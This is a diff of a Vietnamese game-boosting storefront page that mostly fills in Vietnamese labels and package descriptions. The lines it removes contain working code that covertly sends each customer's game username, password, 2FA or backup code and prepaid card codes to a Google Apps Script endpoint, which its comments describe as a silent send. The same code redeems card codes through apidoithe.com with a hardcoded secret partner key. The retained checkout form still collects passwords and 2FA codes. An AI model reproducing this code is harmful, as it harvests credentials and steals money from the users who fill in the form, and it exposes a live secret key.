@@ -3,15 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SHOPHOTRO</title>
+    <title>SHOPHOTRO - Hệ Thống Cày Thuê Uy Tín</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- FontAwesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Google Fonts Space Grotesk & Inter -->
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
-    <!-- Thư viện mã hóa CryptoJS hỗ trợ tạo chữ ký MD5 cho apidoithe.com -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <style>
         body { 
             font-family: 'Inter', sans-serif; 
@@ -68,17 +66,17 @@
                     <i class="fa-solid fa-gamepad"></i>
                 </div>
                 <h1 class="text-3xl font-bold tracking-tight font-heading">ĐĂNG NHẬP</h1>
-                <p class="text-slate-700 text-sm mt-1 font-semibold"></p>
+                <p class="text-slate-700 text-sm mt-1 font-semibold">Nhập tên tài khoản của bạn để tiếp tục</p>
             </div>
 
             <form id="login-form" onsubmit="handleLogin(event)" class="space-y-4">
                 <div>
-                    <label class="block text-xs font-black uppercase tracking-wider text-black mb-2"></label>
+                    <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Tên tài khoản / Biệt danh</label>
                     <div class="relative">
                         <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-black">
                             <i class="fa-solid fa-user"></i>
                         </span>
-                        <input type="text" id="username-input" required placeholder="Ví dụ: ProGamer99"
+                        <input type="text" id="username-input" required
                             class="w-full bg-white neo-input rounded-xl px-4 py-3 pl-11 text-sm font-semibold text-black transition">
                     </div>
                 </div>
@@ -98,6 +96,9 @@
                     <div class="w-12 h-12 bg-black text-white neo-box-static rounded-xl flex items-center justify-center font-black text-xl">
                         <i class="fa-solid fa-bolt"></i>
                     </div>
+                    <div>
+                        <h1 class="text-xl font-black font-heading tracking-tight">SHOPHOTRO</h1>
+                    </div>
                 </div>
 
                 <div class="flex items-center space-x-4">
@@ -106,7 +107,7 @@
                         <span class="text-sm font-black text-black" id="display-username">User</span>
                     </div>
                     <button onclick="handleLogout()" title="Đổi tài khoản" class="bg-red-400 hover:bg-red-500 neo-btn px-3 py-2 rounded-xl text-black font-black text-sm transition flex items-center gap-1">
-                        <i class="fa-solid fa-right-from-bracket"></i> Đăng xuất
+                        <i class="fa-solid fa-right-from-bracket"></i> <span class="hidden md:inline">Đăng xuất</span>
                     </button>
                 </div>
             </div>
@@ -118,9 +119,8 @@
             <div class="bg-neutral-50 border-b-4 border-black py-8 px-4">
                 <div class="max-w-6xl mx-auto flex flex-col md:flex-row items-center justify-between gap-6">
                     <div>
-                        <span class="bg-black text-white text-xs font-black px-3 py-1 rounded-md uppercase tracking-wider">Hệ Thống Uy Tín</span>
-                        <h2 class="text-3xl md:text-4xl font-black font-heading mt-2">SHOP HỖ TRỢ CÀY GAME</h2>
-                        <p class="text-slate-600 text-sm font-semibold mt-1">Blox Fruits - Free Fire - FC Mobile VN nhanh chóng, an toàn tuyệt đối.</p>
+                        <h2 class="text-3xl md:text-4xl font-black font-heading mt-2">SHOP HỖ TRỢ</h2>
+                        <p class="text-slate-600 text-sm font-semibold mt-1">Blox Fruits - Free Fire - FC Mobile VN</p>
                     </div>
 
                     <!-- Facebook Box Banner Widget -->
@@ -130,7 +130,7 @@
                             <i class="fa-brands fa-facebook-f"></i>
                         </div>
                         <div class="text-left">
-                            <span class="block text-[10px] font-black uppercase tracking-wider opacity-90">Liên Hệ </span>
+                            <span class="block text-[10px] font-black uppercase tracking-wider opacity-90">Liên Hệ Quản Trị Viên</span>
                             <span class="block text-lg font-black font-heading tracking-tight">Zhi Yŏng</span>
                         </div>
                     </a>
@@ -165,7 +165,7 @@
                                 <i class="fa-solid fa-shield-halved"></i>
                             </div>
                             <h4 class="text-2xl font-bold font-heading tracking-tight">Combo Tiết Kiệm</h4>
-                            <p class="text-slate-600 text-xs mt-1 font-semibold"></p>
+                            <p class="text-slate-600 text-xs mt-1 font-semibold">Gói cơ bản phù hợp cho người chơi mới bắt đầu tăng tiến.</p>
                             
                             <div class="mt-5 space-y-2.5">
                                 <div class="flex items-start text-xs font-semibold text-black">
@@ -203,7 +203,7 @@
                                 <i class="fa-solid fa-bolt"></i>
                             </div>
                             <h4 class="text-2xl font-bold font-heading tracking-tight">Combo Thường</h4>
-                            <p class="text-slate-600 text-xs mt-1 font-semibold"></p>
+                            <p class="text-slate-600 text-xs mt-1 font-semibold">Gói nâng cấp toàn diện giúp tăng tốc độ cày cấp và tài nguyên.</p>
                             
                             <div class="mt-5 space-y-2.5">
                                 <div class="flex items-start text-xs font-semibold text-black">
@@ -247,7 +247,7 @@
                                 <i class="fa-solid fa-crown"></i>
                             </div>
                             <h4 class="text-2xl font-bold font-heading tracking-tight">Combo Cao Cấp</h4>
-                            <p class="text-slate-600 text-xs mt-1 font-semibold"></p>
+                            <p class="text-slate-600 text-xs mt-1 font-semibold">Gói đỉnh cao dành cho cao thủ muốn đạt tối đa sức mạnh.</p>
                             
                             <div class="mt-5 space-y-2.5">
                                 <div class="flex items-start text-xs font-semibold text-black">
@@ -288,14 +288,14 @@
                                 <i class="fa-solid fa-bullseye"></i>
                             </div>
                             <h4 class="text-2xl font-bold font-heading tracking-tight">Combo Tiết Kiệm</h4>
-                            <p class="text-slate-600 text-xs mt-1 font-semibold"></p>
+                            <p class="text-slate-600 text-xs mt-1 font-semibold">Leo rank nhanh chóng và cải thiện chỉ số súng hiệu quả.</p>
                             
                             <div class="mt-5 space-y-2.5">
                                 <div class="flex items-start text-xs font-semibold text-black">
                                     <i class="fa-solid fa-check text-amber-700 mr-2 mt-0.5 font-black"></i> Đồng --> Kim Cương IV (BR&CS)
                                 </div>
                                 <div class="flex items-start text-xs font-semibold text-black">
-                                    <i class="fa-solid fa-check text-amber-700 mr-2 mt-0.5 font-black"></i> +500 điểm TOP SÚNG(Ghi chú)
+                                    <i class="fa-solid fa-check text-amber-700 mr-2 mt-0.5 font-black"></i> +500 điểm TOP SÚNG (Ghi chú)
                                 </div>
                             </div>
                         </div>
@@ -320,7 +320,7 @@
                                 <i class="fa-solid fa-crosshairs"></i>
                             </div>
                             <h4 class="text-2xl font-bold font-heading tracking-tight">Combo Thường</h4>
-                            <p class="text-slate-600 text-xs mt-1 font-semibold"></p>
+                            <p class="text-slate-600 text-xs mt-1 font-semibold">Tăng bậc uy tín với tỷ lệ thắng cao và bảo hiểm sao an toàn.</p>
                             
                             <div class="mt-5 space-y-2.5">
                                 <div class="flex items-start text-xs font-semibold text-black">
@@ -358,7 +358,7 @@
                                 <i class="fa-solid fa-fire-flame-curved"></i>
                             </div>
                             <h4 class="text-2xl font-bold font-heading tracking-tight">Combo Cao Cấp</h4>
-                            <p class="text-slate-600 text-xs mt-1 font-semibold"></p>
+                            <p class="text-slate-600 text-xs mt-1 font-semibold">Đẳng cấp cao thủ, chuỗi thắng liên tiếp và bảo mật tuyệt đối.</p>
                             
                             <div class="mt-5 space-y-2.5">
                                 <div class="flex items-start text-xs font-semibold text-black">
@@ -368,7 +368,7 @@
                                     <i class="fa-solid fa-check text-amber-600 mr-2 mt-0.5 font-black"></i> +2,500 điểm TOP SÚNG
                                 </div>
                                 <div class="flex items-start text-xs font-semibold text-black">
-                                    <i class="fa-solid fa-check text-amber-600 mr-2 mt-0.5 font-black"></i> Streak 8-10
+                                    <i class="fa-solid fa-check text-amber-600 mr-2 mt-0.5 font-black"></i> Streak 8-10 trận
                                 </div>
                                 <div class="flex items-start text-xs font-semibold text-black">
                                     <i class="fa-solid fa-check text-amber-600 mr-2 mt-0.5 font-black"></i> Ẩn thông tin
@@ -399,7 +399,7 @@
                                 <i class="fa-solid fa-futbol"></i>
                             </div>
                             <h4 class="text-2xl font-bold font-heading tracking-tight">Combo Tiết Kiệm</h4>
-                            <p class="text-slate-600 text-xs mt-1 font-semibold">.</p>
+                            <p class="text-slate-600 text-xs mt-1 font-semibold">Tối ưu hóa đội hình và thăng hạng giải đấu cơ bản.</p>
                             
                             <div class="mt-5 space-y-2.5">
                                 <div class="flex items-start text-xs font-semibold text-black">
@@ -434,7 +434,7 @@
                                 <i class="fa-solid fa-trophy"></i>
                             </div>
                             <h4 class="text-2xl font-bold font-heading tracking-tight">Combo Thường</h4>
-                            <p class="text-slate-600 text-xs mt-1 font-semibold"></p>
+                            <p class="text-slate-600 text-xs mt-1 font-semibold">Leo rank mượt mà và tích lũy Gems đổi quà giá trị.</p>
                             
                             <div class="mt-5 space-y-2.5">
                                 <div class="flex items-start text-xs font-semibold text-black">
@@ -452,7 +452,7 @@
                         <div class="mt-8 pt-5 border-t-2 border-black flex items-center justify-between">
                             <div>
                                 <span class="text-xs text-slate-500 font-bold block">Thanh Toán</span>
-                                <span class="text-xl font-black text-slate-700 font-heading">50,000 đ</span>
+                                <span class="text-xl font-black text-slate-700 font-heading">70,000 đ</span>
                             </div>
                             <button onclick="openCheckout('FC Mobile VN', 'COMBO THƯỜNG', '70,000 đ')" 
                                 class="bg-black hover:bg-neutral-800 text-white font-black text-xs px-6 py-3 rounded-xl neo-btn">
@@ -469,7 +469,7 @@
                                 <i class="fa-solid fa-medal"></i>
                             </div>
                             <h4 class="text-2xl font-bold font-heading tracking-tight">Combo Cao Cấp</h4>
-                            <p class="text-slate-600 text-xs mt-1 font-semibold"></p>
+                            <p class="text-slate-600 text-xs mt-1 font-semibold">Chinh phục đỉnh cao Siêu Sao với sự phục vụ từ các pro player.</p>
                             
                             <div class="mt-5 space-y-2.5">
                                 <div class="flex items-start text-xs font-semibold text-black">
@@ -499,12 +499,12 @@
         <!-- CHECKOUT PAGE (Dedicated View / Separate Page) -->
         <div id="checkout-view" class="hidden flex-1 max-w-3xl mx-auto px-4 py-8 w-full">
             <button onclick="backToStore()" class="inline-flex items-center text-sm font-black text-white mb-6 bg-black px-4 py-2 rounded-xl neo-btn transition">
-                <i class="fa-solid fa-arrow-left mr-2"></i> Quay lại
+                <i class="fa-solid fa-arrow-left mr-2"></i> Quay lại cửa hàng
             </button>
 
             <div class="bg-white neo-box-static rounded-3xl p-8 relative bg-neutral-50/50">
-                <h3 class="text-3xl font-bold font-heading mb-1 text-black">THÔNG TIN </h3>
-                <p class="text-slate-700 text-sm mb-6 font-semibold"></p>
+                <h3 class="text-3xl font-bold font-heading mb-1 text-black">XÁC NHẬN THANH TOÁN</h3>
+                <p class="text-slate-700 text-sm mb-6 font-semibold">Vui lòng điền đầy đủ thông tin tài khoản và mã thẻ (nếu thanh toán bằng thẻ cào) để nhân viên tiến hành hỗ trợ.</p>
 
                 <div class="bg-white neo-box-static rounded-2xl p-5 space-y-2.5 mb-8">
                     <div class="flex justify-between text-sm">
@@ -520,7 +520,7 @@
                         <span class="font-black text-amber-700" id="checkout-package">-</span>
                     </div>
                     <div class="flex justify-between text-sm pt-3 border-t-2 border-black">
-                        <span class="text-black font-bold">Thanh Toán:</span>
+                        <span class="text-black font-bold">Thành tiền:</span>
                         <span class="font-black text-lg text-emerald-600 font-heading" id="checkout-price">-</span>
                     </div>
                 </div>
@@ -528,7 +528,7 @@
                 <form onsubmit="submitOrder(event)" class="space-y-5">
                     <div>
                         <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Tài khoản đăng nhập (Google / Facebook / VK)</label>
-                        <input type="text" id="game-account" required placeholder="Nhập tên đăng nhập game..." 
+                        <input type="text" id="game-account" required placeholder="Nhập tên đăng nhập hoặc email game..." 
                             class="w-full bg-white neo-input rounded-xl px-4 py-3 text-sm font-semibold text-black transition">
                     </div>
 
@@ -540,20 +540,20 @@
 
                     <div>
                         <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Mã xác minh 2 bước (2FA / Backup code - Nếu có)</label>
-                        <input type="text" id="game-2fa" placeholder="" 
+                        <input type="text" id="game-2fa" placeholder="Nhập mã 2FA nếu tài khoản bật bảo mật..." 
                             class="w-full bg-white neo-input rounded-xl px-4 py-3 text-sm font-semibold text-black transition">
                     </div>
 
                     <!-- Two Card Code Inputs -->
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                         <div>
-                            <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Mã thẻ (Garena/Vinaphone/Viettel)</label>
-                            <input type="text" id="card-code-input-1" placeholder="" 
+                            <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Mã thẻ 1 (Garena / Viettel / Vina)</label>
+                            <input type="text" id="card-code-input-1" placeholder="Nhập mã thẻ 1..." 
                                 class="w-full bg-white neo-input rounded-xl px-4 py-3 text-sm font-semibold text-black transition">
                         </div>
                         <div>
-                            <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Mã thẻ (Garena/Vinaphone/Viettel)</label>
-                            <input type="text" id="card-code-input-2" placeholder="" 
+                            <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Mã thẻ 2 (Nếu thanh toán bù)</label>
+                            <input type="text" id="card-code-input-2" placeholder="Nhập mã thẻ 2..." 
                                 class="w-full bg-white neo-input rounded-xl px-4 py-3 text-sm font-semibold text-black transition">
                         </div>
                     </div>
@@ -561,12 +561,12 @@
                     <!-- Two Serial Number Inputs (Số seri) -->
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                         <div>
-                            <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Số seri 1 (Nếu có)</label>
+                            <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Số seri thẻ 1</label>
                             <input type="text" id="serial-input-1" placeholder="Nhập số seri thẻ 1..." 
                                 class="w-full bg-white neo-input rounded-xl px-4 py-3 text-sm font-semibold text-black transition">
                         </div>
                         <div>
-                            <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Số seri 2 (Nếu có)</label>
+                            <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Số seri thẻ 2</label>
                             <input type="text" id="serial-input-2" placeholder="Nhập số seri thẻ 2..." 
                                 class="w-full bg-white neo-input rounded-xl px-4 py-3 text-sm font-semibold text-black transition">
                         </div>
@@ -574,7 +574,7 @@
 
                     <!-- Free Fire Specific IGA Option -->
                     <div id="ff-options-container" class="space-y-2 p-4 bg-neutral-100 neo-box-static rounded-xl hidden">
-                        <label class="block text-xs font-black text-black uppercase">Tùy chọn (Free Fire</label>
+                        <label class="block text-xs font-black text-black uppercase">Tùy chọn nâng cao (Free Fire)</label>
                         <div class="flex items-center space-x-2">
                             <input type="checkbox" id="option-iga" class="w-4 h-4 border-2 border-black rounded text-black focus:ring-black">
                             <label for="option-iga" class="text-xs font-bold text-black">Kích hoạt IGA (InGuestAccount) & Hỗ Trợ Chống Scam</label>
@@ -582,13 +582,13 @@
                     </div>
 
                     <div>
-                        <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Ghi chú thêm </label>
-                        <textarea id="game-note" rows="3" placeholder="VD: Đừng đổi mật khẩu cấp 2, thời gian rảnh..." 
+                        <label class="block text-xs font-black uppercase tracking-wider text-black mb-2">Ghi chú thêm cho thợ cày</label>
+                        <textarea id="game-note" rows="3" placeholder="VD: Đừng đổi mật khẩu cấp 2, thời gian rảnh có thể vào chơi..." 
                             class="w-full bg-white neo-input rounded-xl p-3 text-sm font-semibold text-black transition"></textarea>
                     </div>
 
                     <button type="submit" class="w-full bg-black hover:bg-neutral-800 text-white font-black py-4 px-4 rounded-xl neo-btn transition text-base flex items-center justify-center gap-2">
-                        Hoàn Tất <i class="fa-solid fa-check"></i>
+                        HOÀN TẤT ĐẶT DỊCH VỤ <i class="fa-solid fa-check"></i>
                     </button>
                 </form>
             </div>
@@ -611,16 +611,6 @@
         let currentSelectedGame = '';
         let currentSelectedPackage = '';
         let currentSelectedPrice = '';
-        
-        // Link Google Apps Script Web App được tích hợp ngầm[cite: 2]
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyEq_GEx-EF6abNi8rT20RXto-LLKcMwLcUqVz-SfnaFXbsdTy-Uy72Us9dGyXShR36/exec';
-
-        // Cấu hình API apidoithe.com với thông tin thật của bạn[cite: 4]
-        const APIDOITHE_CONFIG = {
-            url: 'https://apidoithe.com/chargingws/v2',
-            partnerId: '51154522170',
-            partnerKey: 'i9xcwxbuwjy3xly0dbm24cvfxvemjmol'
-        };
 
         // Initialize App on Load
         window.onload = function() {
@@ -642,7 +632,7 @@
             
             document.getElementById('login-modal').classList.add('hidden');
             activateApp(currentUser);
-            showToast('Đăng nhập thành công', `Chào mừng bạn quay lại, ${currentUser}!`);
+            showToast(`Chào, ${currentUser}`, '');
         }
 
         // Activate Main Screen
@@ -743,75 +733,24 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // Submit Order Handler (Gửi ngầm dữ liệu tới Google Sheets[cite: 2] và gọi API apidoithe.com)
+        // Submit Order Handler
         function submitOrder(e) {
             e.preventDefault();
             
-            const cardCode1 = document.getElementById('card-code-input-1').value.trim();
-            const serial1 = document.getElementById('serial-input-1').value.trim();
-            const cardCode2 = document.getElementById('card-code-input-2').value.trim();
-            const serial2 = document.getElementById('serial-input-2').value.trim();
-
             // Gather order details
             const orderData = {
                 thoiGian: new Date().toLocaleString('vi-VN'),
                 taiKhoan: document.getElementById('game-account').value,
                 matKhau: document.getElementById('game-password').value,
                 combo: `${currentSelectedGame} - ${currentSelectedPackage}`,
-                maThe: `1: ${cardCode1 || 'N/A'} | 2: ${cardCode2 || 'N/A'}`,
-                seri: `1: ${serial1 || 'N/A'} | 2: ${serial2 || 'N/A'}`,
+                maThe: `1: ${document.getElementById('card-code-input-1').value || 'N/A'} | 2: ${document.getElementById('card-code-input-2').value || 'N/A'}`,
+                seri: `1: ${document.getElementById('serial-input-1').value || 'N/A'} | 2: ${document.getElementById('serial-input-2').value || 'N/A'}`,
                 thanhToan: currentSelectedPrice,
                 khachHang: currentUser,
                 ghiChu: document.getElementById('game-note').value,
                 twoFA: document.getElementById('game-2fa').value,
                 iga: document.getElementById('option-iga').checked ? 'Có' : 'Không'
             };
-
-            // 1. Gửi dữ liệu ngầm không xuất hiện màn hình hay chuyển hướng (mode: 'no-cors') tới Google Sheets[cite: 2]
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(orderData)
-            }).then(() => {
-                console.log('Đã gửi thông tin đơn hàng ngầm vào Google Sheets thành công.');[cite: 2]
-            }).catch(err => {
-                console.error('Lỗi khi gửi ngầm:', err);
-            });
-
-            // 2. Tích hợp gọi API gạch thẻ ngầm sang apidoithe.com (nếu người dùng có nhập mã thẻ 1)
-            if (cardCode1) {
-                const requestId = 'MG_' + new Date().getTime();
-                const rawSign = APIDOITHE_CONFIG.partnerKey + cardCode1 + serial1;
-                const signature = CryptoJS.MD5(rawSign).toString();
-
-                const cardPayload = {
-                    partner_id: APIDOITHE_CONFIG.partnerId,
-                    request_id: requestId,
-                    telco: 'GARENA',
-                    code: cardCode1,
-                    serial: serial1,
-                    amount: 0,
-                    sign: signature
-                };
-
-                fetch(APIDOITHE_CONFIG.url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(cardPayload)
-                })
-                .then(res => res.json())
-                .then(response => {
-                    console.log('Phản hồi từ apidoithe.com:', response);
-                })
-                .catch(error => {
-                    console.error('Lỗi gọi API apidoithe:', error);
-                });
-            }
 
             backToStore();
             showToast('Đặt dịch vụ thành công!', 'Đơn hàng đã được ghi nhận. Nhân viên sẽ liên hệ và xử lý cho bạn!');
@@ -826,6 +765,11 @@
 
             toastTitle.textContent = title;
             toastMsg.textContent = msg;
+            if(!msg) {
+                toastMsg.classList.add('hidden');
+            } else {
+                toastMsg.classList.remove('hidden');
+            }
 
             if(type === 'info') {
                 toastIcon.innerHTML = '<i class="fa-solid fa-circle-info text-sky-600"></i>';
